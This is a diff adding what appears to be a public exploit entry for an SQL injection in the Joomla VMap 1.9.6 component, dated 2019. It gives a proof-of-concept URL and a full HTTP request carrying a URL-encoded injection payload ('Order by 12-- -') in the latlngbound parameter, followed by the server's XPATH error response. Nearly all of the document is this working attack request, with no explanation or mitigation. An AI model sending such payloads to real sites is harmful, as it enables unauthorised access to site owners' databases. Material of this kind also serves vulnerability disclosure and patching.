@@ -1,0 +1,38 @@
+# Exploit Title: Joomla! Component VMap 1.9.6 - SQL Injection
+# Dork: N/A
+# Date: 2019-01-23
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://wdmtech.com/
+# Software Link: https://extensions.joomla.org/extensions/extension/maps-a-weather/maps-a-locations/vmap/
+# Version: 1.9.6
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/index.php?option=com_vmap&task=loadmarker&latlngbound=[SQL]&mapid=1
+# 
+
+GET /[PATH]/index.php?option=com_vmap&task=loadmarker&latlngbound=-40.716362432588596,40.71920853699145,-73.983044552948,-73.972959447052%20%4f%72%64%65%72%20%62%79%20%31%32%2d%2d%20%2d&mapid=1 HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: 1b9dcd66a46474552f38b0164f24ac07=1dc22d621aab1d9d01c05431e9b453b3; currentURI=http%3A%2F%2Flocalhost%2Fjomsocial-profile-layout%2F709-john-dev%2Ffriends%3Fq%3D%2527%26search%3Dfriends%26option%3Dcom_community%26view%3Dfriends%26Itemid%3D526
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+HTTP/1.1 500 XPATH syntax error:...
+Date: Tue, 22 Jan 2019 21:16:19 GMT
+Server: Apache
+X-Powered-By: PHP/5.6.16
+X-Logged-In: False
+P3P: CP="NOI ADM DEV PSAi COM NAV OUR OTRo STP IND DEM"
+Cache-Control: no-cache
+Pragma: no-cache
+Vary: Accept-Encoding
+Connection: close
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
